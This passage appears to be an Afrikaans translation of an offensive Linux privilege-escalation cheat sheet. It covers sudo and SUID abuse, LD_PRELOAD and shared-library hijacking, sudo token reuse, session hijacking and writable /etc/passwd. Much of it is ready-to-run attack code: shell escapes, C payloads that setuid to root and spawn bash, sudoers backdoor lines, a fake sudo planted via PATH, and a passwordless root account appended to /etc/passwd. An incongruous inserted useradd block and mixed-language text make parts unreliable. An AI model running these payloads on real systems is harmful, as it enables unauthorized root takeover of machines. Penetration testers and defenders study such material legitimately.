Die stelsel is veelsydig en ondersteun basiese IPC wat die data-uitruiling tussen prosesse verbeter, soortgelyk aan verbeterde UNIX domain sockets. Verder help dit met die uitsending van gebeurtenisse of seine, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler stilmaak om die gebruikerervaring te verbeter. D-Bus ondersteun ook 'n remote object system wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig, en prosesse stroomlyn wat tradisioneel kompleks was.

D-Bus werk op 'n allow/deny model wat boodskappermitte (metode-aanroepe, seinuitsending, ens.) bestuur op grond van die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleid spesifiseer interaksies met die bus en kan moontlik tot privilege escalation lei deur die uitbuiting van hierdie permitte.

'n Voorbeeld van so 'n beleid in /etc/dbus-1/system.d/wpa_supplicant.conf word verskaf, wat permitte beskryf vir die root-gebruiker om te besit, na toe te stuur en boodskappe van fi.w1.wpa_supplicant1 te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep geld universeel, terwyl "default" konteksbeleide op alle gebruikers wat nie deur ander spesifieke beleide gedek word van toepassing is.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hier hoe om 'n D-Bus-kommunikasie te ondersoek en uit te buit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te ondersoek en die posisie van die masjien te bepaal.

### Generiese verkenning
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop wat jy nie kon benader voordat jy toegang daartoe gekry het:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kontroleer of jy verkeer kan sniff. As jy dit kan, kan jy dalk sekere credentials onderskep.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Enumerasie

Kontroleer **wie** jy is, watter **privileges** jy het, watter **gebruikers** in die stelsels is, wie kan **login** en wie het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om hul bevoegdhede te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Benut dit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kontroleer of jy 'n **lid van 'n groep** is wat jou root-bevoegdhede kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kontroleer of daar iets interessant in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **ken enige wagwoord** van die omgewing **probeer om as elke gebruiker in te teken** met die wagwoord.

### Su Brute

As jy nie omgee om baie geraas te veroorsaak nie en die `su` en `timeout` binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH misbruik

### $PATH

As jy ontdek dat jy **binne some folder of the $PATH** kan skryf, mag jy in staat wees om privstasies te eskaleer deur **'n backdoor binne die skryfbare vouer te skep** met die naam van 'n kommando wat deur 'n ander gebruiker (root ideaal) uitgevoer gaan word en wat **nie vanaf 'n vouer gelaai word wat voorheen in $PATH geleë is** nie.

### SUDO and SUID

Jy mag toegelaat word om sekere kommando's met sudo uit te voer of hulle kan die suid bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n gebruiker toelaat om 'n kommando met 'n ander gebruiker se bevoegdhede uit te voer sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer; dit is nou eenvoudig om 'n shell te kry deur 'n ssh key in die root directory by te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **'n omgewingsveranderlike te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwetsbaar** vir **PYTHONPATH hijacking** om 'n ewekansige python-biblioteek te laai terwyl die skrip as root uitgevoer word:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Hoekom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en sources daardie lêer voordat die teiken-script uitgevoer word. Baie sudo-reëls laat toe om 'n script of 'n shell-wrapper uit te voer. As `BASH_ENV` deur sudo bewaar word, word jou lêer met root privileges gesourced.

- Vereistes:
- 'n sudo-reël wat jy kan loop (enige teiken wat `/bin/bash` nie-interaktief aanroep, of enige bash script).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`, verkies `env_reset`.
- Vermy shell wrappers vir sudo-allowed commands; gebruik minimale binaries.
- Oorweeg sudo I/O-logging en waarskuwings wanneer preserved env vars gebruik word.

### Paadjies om sudo-uitvoering te omseil

**Gaan** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As 'n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sonder die opdragpad

As die **sudo toestemming** aan 'n enkele opdrag gegee word **sonder om die pad te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH variable te verander.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binarie **'n ander opdrag uitvoer sonder om die pad daarvoor te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID-binarie)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID-binarie met opdragpad

As die **suid** binarie **'n ander opdrag uitvoer en die pad spesifiseer**, kan jy probeer om 'n funksie met dieselfde naam as die opdrag wat die suid-lêer aanroep, te **export a function**.

Byvoorbeeld, as 'n suid binarie aanroep _**/usr/sbin/service apache2 start**_ moet jy probeer om die funksie te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer gedeelde biblioteke (.so files) te spesifiseer wat deur die loader voor alle ander gelaai word, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die voorlading van 'n biblioteek.

Om egter stelselveiligheid te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral by **suid/sgid** uitvoerbare lêers, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruiker-ID (_ruid_) nie ooreenstem met die effektiewe gebruiker-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpaaie wat ook suid/sgid is, voorgeladen.

Privilege escalation kan plaasvind as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike voortbestaan en herken word selfs wanneer opdragte met `sudo` uitgevoer word, wat potensieel kan lei tot die uitvoering van arbitrêre kode met verhoogde voorregte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** deur:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **escalate privileges** wat uitgevoer word
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> ’n soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** env variable beheer, omdat hy die pad beheer waar libraries gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy 'n binary met **SUID**-toestemmings teëkom wat ongewoon lyk, is dit 'n goeie praktyk om te kontroleer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, die voorkoms van 'n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui op 'n potensiaal vir uitbuiting.

Om dit uit te buit, skep mens 'n C-lêer, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit gecompileer en uitgevoer is, mik om voorregte te verhoog deur lêertoestemmings te manipuleer en 'n shell met verhoogde voorregte uit te voer.

Kompileer die bostaande C-lêer in 'n shared object (.so) lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoering van die geaffekteerde SUID binary die exploit te aktiveer, wat 'n potensiële kompromittering van die stelsel moontlik maak.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Aangesien ons 'n SUID binary gevind het wat 'n library uit 'n vouer laai waarin ons kan skryf, kom ons skep die library in daardie vouer met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het 'n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekureerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **only inject arguments** in 'n command kan.

Die projek versamel wettige funksies van Unix binaries wat misbruik kan word om uit restricted shells te breek, privileges te eskaleer of te behou, files oor te dra, bind en reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die hulpmiddel [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit kan uitvind hoe om enige sudo-reël te exploiteer.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy regte eskaleer deur te wag vir 'n sudo command uitvoering en dan die sessie-token te kaap.

Vereistes om regte te eskaleer:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **used `sudo`** om iets uit te voer in die **laaste 15mins** (standaard is dit die duur van die sudo-token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toegankelijk (jy moet in staat wees om dit op te laai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` aan te pas en `kernel.yama.ptrace_scope = 0` te stel)

As al hierdie vereistes vervul is, **kan jy regte eskaleer deur:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **first exploit** (`exploit.sh`) sal die binêre `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die **sudo token in jou sessie te aktiveer** (jy sal nie outomaties 'n root shell kry nie — doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ skep **deur root besit met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers file skep** wat **sudo tokens ewig maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryfpermissies** het in die gids of op enige van die aangemaakte lêers binne die gids, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **'n sudo-token vir 'n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het 'n shell as daardie gebruiker met PID 1234, kan jy **verkry sudo privileges** sonder om die wagwoord te hoef te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` bepaal wie `sudo` kan gebruik en hoe. Hierdie lêers **standaard slegs deur die gebruiker root en die groep root gelees word**.\
**As** jy hierdie lêer kan **lees** kan jy dalk **sommige interessante inligting bekom**, en as jy enige lêer kan **skryf** sal jy in staat wees om **escalate privileges**
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissies te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binêre, soos `doas` op OpenBSD — onthou om die konfigurasie by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Indien jy weet dat 'n **gebruiker gewoonlik op 'n masjien aanmeld en `sudo` gebruik** om bevoegdhede te eskaleer en jy het 'n shell binne daardie gebruikerskonteks, kan jy **'n nuwe sudo uitvoerbare** skep wat jou kode as root uitvoer en daarna die gebruiker se opdrag. Daarna, **wysig die $PATH** van die gebruikerskonteks (byvoorbeeld deur die nuwe pad by .bash_profile te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo uitvoerbare uitgevoer word.

Let wel dat as die gebruiker 'n ander shell gebruik (nie bash nie) jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waarvandaan die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **libraries** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel na libraries binne `/usr/local/lib` sal soek**.

Indien om een of ander rede **'n gebruiker skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf` kan hy moontlik escalate privileges.\
Kyk na **how to exploit this misconfiguration** op die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos in die `RPATH`-veranderlike gespesifiseer.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities voorsien 'n **substel van die beskikbare root privileges aan 'n proses**. Dit breek effektief root **privileges in kleiner en onderskeibare eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volle stel privileges verminder, wat die risiko's van misbruik verlaag.\
Lees die volgende bladsy om **meer te leer oor capabilities en hoe om dit te misbruik**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In 'n directory beteken die **bit for "execute"** dat die betrokke gebruiker in die vouer kan "**cd**".\
Die **"read"** bit beteken dat die gebruiker die **files** kan **list**, en die **"write"** bit beteken dat die gebruiker **delete** en **create** nuwe **files**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van diskresionêre permissies, wat in staat is om die tradisionele ugo/rwx permissions te oorskryf. Hierdie permissies verbeter beheer oor lêer- of directory-toegang deur regte aan spesifieke gebruikers toe te ken of te weier wat nie die eienaars is of deel van die groep nie. Hierdie vlak van **granularity verseker meer presiese toegangsbestuur**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

In **ou weergawes** kan jy moontlik **hijack** 'n **shell** session van 'n ander gebruiker (**root**).\
In **nuutste weergawes** sal jy slegs in staat wees om met screen sessions van **jou eie user** te **connect**. Jy kan egter **interessante inligting** binne die session vind.

### screen sessions hijacking

**Lys screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-sessies kaping

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is as 'n nie-privilegieerde gebruiker kaap nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-keys wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout geraak wees.\
Hierdie fout word veroorsaak wanneer 'n nuwe ssh key in daardie OS geskep word, aangesien **slegs 32,768 variasies moontlik was**. Dit beteken dat alle moontlikhede bereken kan word en **met die ssh public key kan jy die ooreenstemmende private key soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

- **PasswordAuthentication:** Bepaal of password authentication toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Bepaal of public key authentication toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, bepaal dit of die bediener aanmelding by rekeninge met leë wagwoorde toelaat. Die verstek is `no`.

### PermitRootLogin

Gee aan of root via ssh kan aanmeld; verstek is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met password en private key
- `without-password` or `prohibit-password`: root kan slegs met 'n private key aanmeld
- `forced-commands-only`: Root kan slegs aanmeld met 'n private key en as die commands-opsies gespesifiseer is
- `no` : nee

### AuthorizedKeysFile

Gee lêers aan wat die public keys bevat wat vir user authentication gebruik kan word. Dit kan tokens soos `%h` bevat, wat vervang sal word deur die home directory. **Jy kan absolute paths aandui** (begin met `/`) of **relatiewe paths vanaf die gebruiker se home**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer aanmeld met die **private** sleutel van die gebruiker "**testusername**", sal ssh die publieke sleutel van jou sleutel vergelyk met dié in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om **jou plaaslike SSH keys te gebruik in plaas daarvan om keys** (sonder wagwoordfrases!) op jou bediener te laat lê. So sal jy in staat wees om **spring** via ssh **na 'n host** en van daar **spring na 'n ander** host **deur** die **sleutel** te gebruik wat op jou **aanvanklike host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` soos volg stel:
```
Host example.com
ForwardAgent yes
```
Let wel dat as `Host` `*` is, elke keer wanneer die gebruiker na 'n ander masjien spring, daardie host toegang tot die sleutels sal hê (wat 'n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** oorskryf en hierdie konfigurasie toelaat of weier.  
Die lêer `/etc/sshd_config` kan ssh-agent forwarding met die sleutelwoord `AllowAgentForwarding` **toelaat** of **weier** (standaard is toelaat).

As jy vind dat Forward Agent in 'n omgewing geconfigureer is, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enige van hulle kan **skryf of wysig kan jy escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
As enige vreemde profielskrip gevind word, moet jy dit vir **sensitiewe besonderhede** nagaan.

### Passwd/Shadow Lêers

Afhangende van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam hê of daar kan 'n rugsteun wees. Daarom word dit aanbeveel om **al hulle te vind** en **te kyk of jy hulle kan lees** om te sien **of daar hashes** in die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** binne die `/etc/passwd` (of ekwivalente) lêer vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Genereer eers 'n password met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ek het die gebruiker `hacker` geskep en die volgende gegenereerde wagwoord ingestel:

```bash
sudo useradd -m -s /bin/bash hacker
echo 'G7s!r9X#vQ2b@Ld4YpZ' | sudo chpasswd
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` command gebruik met `hacker:hacker`

Alternatiewelik, kan jy die volgende reëls gebruik om 'n dummy gebruiker sonder 'n wagwoord by te voeg.\
WAARSKUWING: dit kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
